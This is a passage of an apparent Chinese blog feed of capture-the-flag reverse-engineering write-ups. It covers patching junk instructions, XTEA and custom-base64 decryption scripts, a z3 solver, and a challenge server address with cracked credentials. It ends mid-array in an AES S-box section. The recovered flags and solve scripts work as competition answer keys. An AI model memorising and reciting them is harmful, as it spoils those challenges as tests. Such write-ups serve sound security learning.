<li>最后判断异或的结果是是否为0，为0则继续判断，否则退出<br><img src="https://i.loli.net/2021/09/04/bfOHWTNQ79gMYXd.png" alt=""><br>以此函数为例，使用0xcc84881e的最低位 0x1e与后面的0x3e 0x46进行异或,可得flag第一位，跟进函数sub_119c：<br><img src="https://i.loli.net/2021/09/04/ArDH4YTKLswboz1.png" alt=""><br>即可得到flag第二个字符的检测：<br><img src="https://i.loli.net/2021/09/04/l5TDXYw6L9yxkuO.png" alt=""><br>一直遍历可得flag:<br><em><code>flag&#123;96c69646-8184-4363-8de9-73f7398066c1&#125;</code></em><h3 id="Pin-插桩"><a href="#Pin-插桩" class="headerlink" title="Pin 插桩"></a>Pin 插桩</h3>待补充。。。。。</li>
</ol>
<h2 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy-crypto"></a>easy-crypto</h2><p><a href="https://drive.google.com/file/d/1QNpSB0HszJ4h_ONWn4eQvTrv01MAXF1v/view?usp=sharing">程序链接</a><br>这个程序是一个PE可执行程序，可以本地动态调试，存在一定的花指令的，无法反汇编，需要将程序进行一些patch</p>
<h3 id="花指令修复"><a href="#花指令修复" class="headerlink" title="花指令修复"></a>花指令修复</h3><p>找到主函数地址<code>0x401660</code>,发现未被实现为函数，手动设置为函数，报错：<br><code>.text:004016F4: The function has undefined instruction/data at the specified address.</code><br>在地址<code>0x4016f4</code>地址存在问题：<br><img src="https://i.loli.net/2021/09/04/NqdT4RcG5JSb36Y.png" alt=""><br>可知<code>0xede9</code>无法被识别, 将其patch为nop。程序存在多个同样的花指令，将其全部patch为nop后，就可以将其设置为函数，并可以进行反编译。</p>
<h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><ul>
<li>main位置变换<br><img src="https://i.loli.net/2021/09/04/s6YUF4SyoHvXLP2.png" alt=""><br><img src="https://i.loli.net/2021/09/04/QbkKCGiJItzuXpE.png" alt=""></li>
<li>base64：<br><img src="https://i.loli.net/2021/09/04/2Gx1nHpN7R85qXu.png" alt=""></li>
<li>使用IDA插件findcrypt插件，查找加密算法，发现存在一个XTEA加密算法：<br><img src="https://i.loli.net/2021/09/04/IDiElqnbypVLUHP.png" alt=""></li>
<li>检测结果<br><img src="https://i.loli.net/2021/09/04/cM2YCPlRS9r7wgu.png" alt=""><br>总结一下，函数通过一种未知变换，再进行XTEA加密后，最后进行base64加密，与密文进行比较。<br>python解密脚本：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table  = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/&#x27;</span></span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;248n4EJTTTEaceRT8kL8EAgoxIaKfvamSsOfg5EXusE&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to</span>(<span class="params">s</span>):</span><br><span class="line">    dd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        dd += (<span class="string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="keyword">return</span> dd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">        flag += (<span class="string">&#x27;&#123;:06b&#125;&#x27;</span>.<span class="built_in">format</span>(table.find(i)))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    flags = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag), <span class="number">8</span>):</span><br><span class="line">        flags.append(<span class="built_in">int</span>(flag[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flags), <span class="number">4</span>):</span><br><span class="line">        <span class="built_in">print</span>(to(flags[i:i+<span class="number">4</span>:][::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
XTEA解密<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt_xtea</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + k[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + k[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>] = &#123;<span class="number">0x12174208</span>, <span class="number">0x7adf778b</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> v1[<span class="number">2</span>] = &#123;<span class="number">0x77ed300a</span>, <span class="number">0xa2c84b21</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> v2[<span class="number">2</span>] = &#123;<span class="number">0xc2861844</span>, <span class="number">0x96f23dae</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> v3[<span class="number">2</span>] = &#123;<span class="number">0x408fccd9</span>, <span class="number">0xca793b5a</span>&#125;;</span><br><span class="line">    <span class="comment">//uint32_t v[2] = &#123;0x33333333, 0x34343434&#125;;</span></span><br><span class="line">    <span class="comment">//uint32_t v[2] = &#123;0xa5884ef3, 0x6ea37aa2&#125;;</span></span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">0x6a</span>,<span class="number">0x78</span>,<span class="number">0x73</span>,<span class="number">0x7a</span>&#125;;</span><br><span class="line">    decrypt_xtea(<span class="number">32</span>, v, k);</span><br><span class="line">    decrypt_xtea(<span class="number">32</span>, v1, k);</span><br><span class="line">    decrypt_xtea(<span class="number">32</span>, v2, k);</span><br><span class="line">    decrypt_xtea(<span class="number">32</span>, v3, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx, %lx,&quot;</span>, v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx, %lx,&quot;</span>, v1[<span class="number">0</span>],v1[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx, %lx,&quot;</span>, v2[<span class="number">0</span>],v2[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx, %lx,&quot;</span>, v3[<span class="number">0</span>],v3[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
由于变换是类似交换的操作，是可逆的，所以将解密的数据直接输入，就可以在动态调试看到flag<br><img src="https://i.loli.net/2021/09/04/KnTsZwmv2rYG6oU.png" alt=""><br><em><code>flag&#123;f1bf4dfbfc4dc9df45b5da87d552ed02&#125;</code></em></li>
</ul>
<h2 id="before-main"><a href="#before-main" class="headerlink" title="before-main"></a>before-main</h2><p>这是最简单的题目，难点是无法反编译，存在花指令，只能看汇编，但只是一个简单的异或</p>
<h3 id="花指令分析"><a href="#花指令分析" class="headerlink" title="花指令分析"></a>花指令分析</h3><p><img src="https://i.loli.net/2021/09/04/pQAlB8KMUZuzrP2.png" alt=""><br>还是存在几个花指令，nop掉之后，还是存在栈不平衡，但是只有存在异或操作<br><img src="https://i.loli.net/2021/09/04/z2UGkaeNfZKyYsF.png" alt=""><br>异或的密文为<code>0x00403138</code>处的数据:<br><img src="https://i.loli.net/2021/09/04/7KBHjuSrQh1msYV.png" alt=""><br>key具有迷惑性，为<code>dword_404018</code>处的数据，但是在<code>0x401075</code>处进行修改了<br><img src="https://i.loli.net/2021/09/04/YwFvHtoNDVu8kgq.png" alt=""><br><img src="https://i.loli.net/2021/09/04/3ntJmDp5rieYk96.png" alt=""><br>key最终为：<code>[122, 115, 120, 106]</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">0x1C</span>, <span class="number">0x1F</span>, <span class="number">0x19</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x19</span>, <span class="number">0x00</span>, <span class="number">0x5F</span>, <span class="number">0x00</span>, <span class="number">0x2C</span>, <span class="number">0x09</span>, <span class="number">0x1D</span>, <span class="number">0x1F</span>, <span class="number">0x2C</span>, <span class="number">0x11</span>, <span class="number">0x58</span>, <span class="number">0x49</span>, <span class="number">0x12</span>, <span class="number">0x0B</span>, <span class="number">0x17</span>]</span><br><span class="line">key = [<span class="number">122</span>, <span class="number">115</span>, <span class="number">120</span>, <span class="number">106</span>]</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(enc)):</span><br><span class="line">  s += (<span class="built_in">chr</span>(enc[i]^key[i%<span class="number">4</span>]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;jx5z_qwe_i23as&#125;</span></span><br></pre></td></tr></table></figure>
<p><em><code>flag&#123;jx5z_qwe_i23as&#125;</code></em></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>RE</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>羊城杯记录</title>
    <url>/2021/09/14/CTF/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="DeltX"><a href="#DeltX" class="headerlink" title="DeltX"></a>DeltX</h1><p>首先使用IDA打开程序，64位程序，程序逻辑分析如下：</p>
<p>读取flag，验证其前缀和指定符号：</p>
<p><img src="https://i.loli.net/2021/09/12/jYB1tK2CzLEWiOv.png" alt="image-20210912112501110"></p>
<p>限制字符的范围为0-9a-z,注意16进制大部分大写，个别小写。并将其转为16进制后，进行运算</p>
<p>程序在二进制层面上实现了一个数字乘法和减法，要求输入两个数的乘积和差值为一个定值，找到这些定值，分解质因数：</p>
<p><img src="https://i.loli.net/2021/09/12/U8XjGIeuRH7xmYE.png" alt="image-20210912115222720"></p>
<p>如上图，分解<code>614340037</code></p>
<p><img src="https://i.loli.net/2021/09/12/Kfnle9H25Tja1vu.png" alt="image-20210912115425475"></p>
<p>将因数组合，使其差值为<code>-42564</code></p>
<p><img src="https://i.loli.net/2021/09/12/PjU9uXcgSOz61r3.png" alt="image-20210912115620394"></p>
<p>找到所有乘积和差值，重复上述过程，可得flag.</p>
<p><img src="https://i.loli.net/2021/09/12/joacSReIWhAXB1n.png" alt="image-20210912115908661"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">result1 = [<span class="number">614340037</span>,<span class="number">885517026</span>,<span class="number">1668903866</span>,<span class="number">241160452</span>]</span><br><span class="line"></span><br><span class="line">result2 = [-<span class="number">42564</span>,<span class="number">8555</span>,<span class="number">33181</span>,<span class="number">37779</span>]</span><br><span class="line"></span><br><span class="line">a,b,c,d,e,f,g,h = Ints(<span class="string">&#x27;a b c d e f g h&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(a&gt;<span class="number">0</span>)</span><br><span class="line">s.add(b&gt;<span class="number">0</span>)</span><br><span class="line">s.add(a*b==result1[<span class="number">0</span>])</span><br><span class="line">s.add(a-b==result2[<span class="number">0</span>])</span><br><span class="line">s.add(c*d==result1[<span class="number">1</span>])</span><br><span class="line">s.add(c-d==result2[<span class="number">1</span>])</span><br><span class="line">s.add(e*f==result1[<span class="number">2</span>])</span><br><span class="line">s.add(e-f==result2[<span class="number">2</span>])</span><br><span class="line">s.add(g*h==result1[<span class="number">3</span>])</span><br><span class="line">s.add(g-h==result2[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">table = [a, b, c, d, e,f, g,h]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag = <span class="string">&#x27;SangFor&#123;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> s.check()==sat:</span><br><span class="line">        m = s.model()</span><br><span class="line">        m.sorts()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">if</span> i==c <span class="keyword">or</span> i ==d:</span><br><span class="line">                flag += (<span class="built_in">hex</span>(m[i].as_long())[<span class="number">2</span>:])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag += (<span class="built_in">hex</span>(m[i].as_long())[<span class="number">2</span>:].upper())</span><br><span class="line">    flag += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># SangFor&#123;2C7BD2BF862564baED0B6B6EA94F15BC&#125;</span></span><br></pre></td></tr></table></figure>
<p><code>SangFor&#123;2C7BD2BF862564baED0B6B6EA94F15BC&#125;</code></p>
<h1 id="BabySmc"><a href="#BabySmc" class="headerlink" title="BabySmc"></a>BabySmc</h1><p>IDA打开程序，64为PE程序，存在代码简单加密:</p>
<p><img src="https://i.loli.net/2021/09/12/TCsw8W26hOytLrE.png" alt="image-20210912120520635"></p>
<p>解密后代码逻辑为</p>
<p>读取flag，使用内置的base表进行编码，将结果与定值进行抑或，写出解密脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = [<span class="number">0xE4</span>, <span class="number">0xC4</span>, <span class="number">0xE7</span>, <span class="number">0xC7</span>, <span class="number">0xE6</span>, <span class="number">0xC6</span>, <span class="number">0xE1</span>, <span class="number">0xC1</span>, <span class="number">0xE0</span>, <span class="number">0xC0</span>, <span class="number">0xE3</span>, <span class="number">0xC3</span>, <span class="number">0xE2</span>, <span class="number">0xC2</span>, <span class="number">0xED</span>, <span class="number">0xCD</span>, <span class="number">0xEC</span>, <span class="number">0xCC</span>, <span class="number">0xEF</span>, <span class="number">0xCF</span>, <span class="number">0xEE</span>, <span class="number">0xCE</span>, <span class="number">0xE9</span>, <span class="number">0xC9</span>, <span class="number">0xE8</span>, <span class="number">0xC8</span>, <span class="number">0xEB</span>, <span class="number">0xCB</span>, <span class="number">0xEA</span>, <span class="number">0xCA</span>, <span class="number">0xF5</span>, <span class="number">0xD5</span>, <span class="number">0xF4</span>, <span class="number">0xD4</span>, <span class="number">0xF7</span>, <span class="number">0xD7</span>, <span class="number">0xF6</span>, <span class="number">0xD6</span>, <span class="number">0xF1</span>, <span class="number">0xD1</span>, <span class="number">0xF0</span>, <span class="number">0xD0</span>, <span class="number">0xF3</span>, <span class="number">0xD3</span>, <span class="number">0xF2</span>, <span class="number">0xD2</span>, <span class="number">0xFD</span>, <span class="number">0xDD</span>, <span class="number">0xFC</span>, <span class="number">0xDC</span>, <span class="number">0xFF</span>, <span class="number">0xDF</span>, <span class="number">0x95</span>, <span class="number">0x9C</span>, <span class="number">0x9D</span>, <span class="number">0x92</span>, <span class="number">0x93</span>, <span class="number">0x90</span>, <span class="number">0x91</span>, <span class="number">0x96</span>, <span class="number">0x97</span>, <span class="number">0x94</span>, <span class="number">0x8A</span>, <span class="number">0x8E</span>]</span><br><span class="line"></span><br><span class="line">enc_bin = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;H&gt;oQn6aqLr&#123;DH6odhdm0dMe`MBo?lRglHtGPOdobDlknejmGI|ghDb&lt;&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">table = [<span class="number">0xa6</span>, <span class="number">0xa3</span>, <span class="number">0xa9</span>, <span class="number">0xac</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            enc_bin += (<span class="string">&#x27;&#123;:06b&#125;&#x27;</span>.<span class="built_in">format</span>(d.index(<span class="built_in">ord</span>(enc[i])^table[i%<span class="number">4</span>])))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;see&quot;</span>,i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(enc_bin), <span class="number">8</span>):</span><br><span class="line">        flag += (<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+enc_bin[i:i+<span class="number">8</span>],<span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># SangFor&#123;XSAYT0u5DQhaxveIR50X1U13M-pZK5A0&#125;</span></span><br></pre></td></tr></table></figure>
<p><code>SangFor&#123;XSAYT0u5DQhaxveIR50X1U13M-pZK5A0&#125;</code></p>
<p><img src="https://i.loli.net/2021/09/12/kw4rBtdK5mLJSjc.png" alt="image-20210912125406560"></p>
<h1 id="Ez-andorio"><a href="#Ez-andorio" class="headerlink" title="Ez_andorio"></a>Ez_andorio</h1><p>用反编译其打开，找到资源文件：</p>
<p>用户名：admin</p>
<p><img src="https://i.loli.net/2021/09/12/TEMC2yLPhXoHudQ.png" alt="image-20210912130143676"></p>
<p>密码：c232666f1410b3f5010dc51cec341f58</p>
<p>enc_flag:3lkHi9iZNK87qw0p6U391t92qlC5rwn5iFqyMFDl1t92qUnL6FQjqln76l-P</p>
<p>服务器端口：”139.224.191.201”, 20080</p>
<p>根据代码逻辑，使用的是md5加密用户密码后，再每个字节减一</p>
<p>修复密码爆破得密码为：<code>654321</code></p>
<p>连接服务器：</p>
<p><img src="https://i.loli.net/2021/09/12/yuzfmBtsYgaln7X.png" alt="image-20210912130534764"></p>
<p>分析加密算法克制， 使用的是base64，</p>
<p>解密代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc  = <span class="string">&#x27;3lkHi9iZNK87qw0p6U391t92qlC5rwn5iFqyMFDl1t92qUnL6FQjqln76l-P&#x27;</span></span><br><span class="line">table = <span class="string">&#x27;TGtUnkaJD0frq61uCQYw3-FxMiRvNOB/EWjgVcpKSzbs8yHZ257X9LldIeh4APom&#x27;</span></span><br><span class="line"></span><br><span class="line">bin_tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    bin_tmp += <span class="string">&#x27;&#123;:06b&#125;&#x27;</span>.<span class="built_in">format</span>(table.index(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_tmp), <span class="number">8</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+bin_tmp[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># SangFor&#123;212f4548-03d1-11ec-ab68-00155db3a27e&#125;</span></span><br></pre></td></tr></table></figure>
<p><code>SangFor&#123;212f4548-03d1-11ec-ab68-00155db3a27e&#125;</code></p>
<h1 id="MISS"><a href="#MISS" class="headerlink" title="MISS"></a>MISS</h1><p>Midnight flag CTF somemissing</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">S_BOX = [</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x7c</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0xf2</span>, <span class="number">0x6b</span>, <span class="number">0x6f</span>, <span class="number">0xc5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2b</span>, <span class="number">0xfe</span>, <span class="number">0xd7</span>, <span class="number">0xab</span>, <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0xca</span>, <span class="number">0x82</span>, <span class="number">0xc9</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xf0</span>, <span class="number">0xad</span>, <span class="number">0xd4</span>, <span class="number">0xa2</span>, <span class="number">0xaf</span>, <span class="number">0x9c</span>, <span class="number">0xa4</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>,</span><br><span class="line">    <span class="number">0xb7</span>, <span class="number">0xfd</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3f</span>, <span class="number">0xf7</span>, <span class="number">0xcc</span>, <span class="number">0x34</span>, <span class="number">0xa5</span>, <span class="number">0xe5</span>, <span class="number">0xf1</span>, <span class="number">0x71</span>, <span class="number">0xd8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0xc7</span>, <span class="number">0x23</span>, <span class="number">0xc3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9a</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xe2</span>, <span class="number">0xeb</span>, <span class="number">0x27</span>, <span class="number">0xb2</span>, <span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2c</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>, <span class="number">0x52</span>, <span class="number">0x3b</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x2f</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x53</span>, <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x20</span>, <span class="number">0xfc</span>, <span class="number">0xb1</span>, <span class="number">0x5b</span>, <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x58</span>, <span class="number">0xcf</span>,</span><br><span class="line">    <span class="number">0xd0</span>, <span class="number">0xef</span>, <span class="number">0xaa</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x4d</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xf9</span>, <span class="number">0x02</span>, <span class="number">0x7f</span>, <span class="number">0x50</span>, <span class="number">0x3c</span>, <span class="number">0x9f</span>, <span class="number">0xa8</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x40</span>, <span class="number">0x8f</span>, <span class="number">0x92</span>, <span class="number">0x9d</span>, <span class="number">0x38</span>, <span class="number">0xf5</span>, <span class="number">0xbc</span>, <span class="number">0xb6</span>, <span class="number">0xda</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xff</span>, <span class="number">0xf3</span>, <span class="number">0xd2</span>,</span><br><span class="line">    <span class="number">0xcd</span>, <span class="number">0x0c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xc4</span>, <span class="number">0xa7</span>, <span class="number">0x7e</span>, <span class="number">0x3d</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4f</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xee</span>, <span class="number">0xb8</span>, <span class="number">0x14</span>, <span class="number">0xde</span>, <span class="number">0x5e</span>, <span class="number">0x0b</span>, <span class="number">0xdb</span>,</span><br><span class="line">    <span class="number">0xe0</span>, <span class="number">0x32</span>, <span class="number">0x3a</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xe4</span>, <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0xe7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x6d</span>, <span class="number">0x8d</span>, <span class="number">0xd5</span>, <span class="number">0x4e</span>, <span class="number">0xa9</span>, <span class="number">0x6c</span>, <span class="number">0x56</span>, <span class="number">0xf4</span>, <span class="number">0xea</span>, <span class="number">0x65</span>, <span class="number">0x7a</span>, <span class="number">0xae</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2e</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0xc6</span>, <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0x74</span>, <span class="number">0x1f</span>, <span class="number">0x4b</span>, <span class="number">0xbd</span>, <span class="number">0x8b</span>, <span class="number">0x8a</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xf6</span>, <span class="number">0x0e</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xb9</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x1d</span>, <span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0xe1</span>, <span class="number">0xf8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xd9</span>, <span class="number">0x8e</span>, <span class="number">0x94</span>, <span class="number">0x9b</span>, <span class="number">0x1e</span>, <span class="number">0x87</span>, <span class="number">0xe9</span>, <span class="number">0xce</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xdf</span>,</span><br><span class="line">    <span class="number">0x8c</span>, <span class="number">0xa1</span>, <span class="number">0x89</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0xe6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2d</span>, <span class="number">0x0f</span>, <span class="number">0xb0</span>, <span class="number">0x54</span>, <span class="number">0xbb</span>, <span class="number">0x16</span>,]</span><br><span class="line"></span><br><span class="line">S_INV_BOX = [</span><br><span class="line">	<span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6a</span>, <span class="number">0xd5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xa5</span>, <span class="number">0x38</span>, <span class="number">0xbf</span>, <span class="number">0x40</span>, <span class="number">0xa3</span>, <span class="number">0x9e</span>, <span class="number">0x81</span>, <span class="number">0xf3</span>, <span class="number">0xd7</span>, <span class="number">0xfb</span>, </span><br><span class="line">	<span class="number">0x7c</span>, <span class="number">0xe3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9b</span>, <span class="number">0x2f</span>, <span class="number">0xff</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8e</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xc4</span>, <span class="number">0xde</span>, <span class="number">0xe9</span>, <span class="number">0xcb</span>, </span><br><span class="line">	<span class="number">0x54</span>, <span class="number">0x7b</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xa6</span>, <span class="number">0xc2</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0xee</span>, <span class="number">0x4c</span>, <span class="number">0x95</span>, <span class="number">0x0b</span>, <span class="number">0x42</span>, <span class="number">0xfa</span>, <span class="number">0xc3</span>, <span class="number">0x4e</span>, </span><br><span class="line">	<span class="number">0x08</span>, <span class="number">0x2e</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span 